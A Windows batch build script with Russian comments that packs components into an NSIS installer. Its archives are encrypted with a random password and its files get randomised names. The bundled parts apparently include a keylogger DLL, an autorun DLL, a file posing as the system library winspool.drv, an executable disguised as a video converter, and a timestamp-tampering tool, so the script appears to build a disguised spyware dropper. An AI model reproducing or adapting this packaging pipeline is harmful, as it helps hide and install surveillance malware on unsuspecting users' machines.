cls
@echo off

set CurDir=%~dp0
set PACK=ntp1

set Zip=..\_7z\system.exe
set ToolsDir=..\_Tools
set ZipDir=Zipped
set ShrDir=..\!Share
set PkgDir=..\..\Package
set MainZipName=%ZipDir%\install.dat

set EncSpec=Editor.exe
set Kdns32=VideoConverter.exe
set StaticDll=winspool.drv
set DynamicDll=videoprocessing.dll
set GenDll=video.dll

call :Clean

rem Читаем из конфига путь к компилятору NSIS
set NSIS_PATH=..\_NSISShare\nsis.path.txt
call :ReadNsisPath

rem Пакуем в архивы со случайным паролем файлы сборки 
call %ToolsDir%\PwdGen.exe > pwd.txt
set /p ZipPwd=<pwd.txt

@rem ---------------------------------------------------------------------------
rem Original
call :MakeZipName
%Zip% a -mhe=on -mx9 -p%ZipPwd% %ZipDir%\%ZipName%.tmp .\Original\*.* 
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% .\%ZipDir%\%ZipName%.tmp
%ToolsDir%\PwdSet.exe "ZipNames.org.nsh" "ZipNames.nsh" %%original%% %ZipName%

rem Автозапуск
call :MakeDllName
%ToolsDir%\PwdSet.exe "ZipNames.nsh" "ZipNames.nsh" %%autorun_dll%% %DllName%
copy /y %ShrDir%\h1.dll %ZipDir%\%DllName%.dll
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% .\%ZipDir%\%DllName%.dll

rem FileTouch
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% %ShrDir%\FileTouch.exe 

rem Статическая dll
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% .\External\%StaticDll%

rem EncodeSpecific.exe
call :MakeZipName
copy /y %ShrDir%\EncodeSpecific.exe %ZipDir%\%ZipName%.tmp
%ToolsDir%\PwdSet.exe "ZipNames.nsh" "ZipNames.nsh" %%encode_spec_exe%% %ZipName%
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% .\%ZipDir%\%ZipName%.tmp

rem Kdns32.exe
call :MakeZipName
copy /b /y "%ShrDir%\Kdns32.exe" %ZipDir%\%ZipName%.tmp
%ToolsDir%\PwdSet.exe "ZipNames.nsh" "ZipNames.nsh" %%kdns_exe%% %ZipName%
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% .\%ZipDir%\%ZipName%.tmp

rem GenDll
call :MakeDllName
%ToolsDir%\PwdSet.exe "ZipNames.nsh" "ZipNames.nsh" %%gen_dll%% %DllName%
copy /b /y External\klog_dll.dll.gen %ZipDir%\%DllName%.dat
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% .\%ZipDir%\%DllName%.dat

rem DynDll
call :MakeDllName
%ToolsDir%\PwdSet.exe "ZipNames.nsh" "ZipNames.nsh" %%dyn_dll%% %DllName%
copy /b /y External\videoprocessing.dll %ZipDir%\%DllName%.dll
%Zip% a -mhe=on -mx9 -p%ZipPwd% %MainZipName% .\%ZipDir%\%DllName%.dll

@rem ---------------------------------------------------------------------------
del pwd.txt
del ZipName.txt
del DllName.txt

copy /y Install.org.nsi Install.nsi
rem Модифицируем скрипт установки
%ToolsDir%\PwdSet.exe "Install.org.nsi" "Install.nsi" %%password%% %ZipPwd%

call %COMP% Install.nsi
del Install.nsi

rem Копируем полученный пакет в целевую директорию
copy /y %PACK%.~exe %PkgDir%\%PACK%.~exe
if exist X:\ copy /y %PACK%.~exe X:\%PACK%.~exe

goto end

:Clean
del %PACK%.exe
del %PACK%.~exe
del /Q Zipped\*.*
exit /b

:ReadNsisPath
@for /f "tokens=*" %%a in (%NSIS_PATH%) do @(
  @set COMP=%%a
  @goto cont
)
:cont
  @if not exist %COMP% (
     @echo.
     @echo.
     @echo NSIS Compiler not found!
     @exit
   )
  @exit /b
)

:MakeZipName
call %ToolsDir%\PwdGen.exe -n > ZipName.txt
set /p ZipName=<ZipName.txt
set ZipName=dev%ZipName%
@exit /b

:MakeDllName
call %ToolsDir%\PwdGen.exe -d > DllName.txt
set /p DllName=<DllName.txt
@exit /b

:end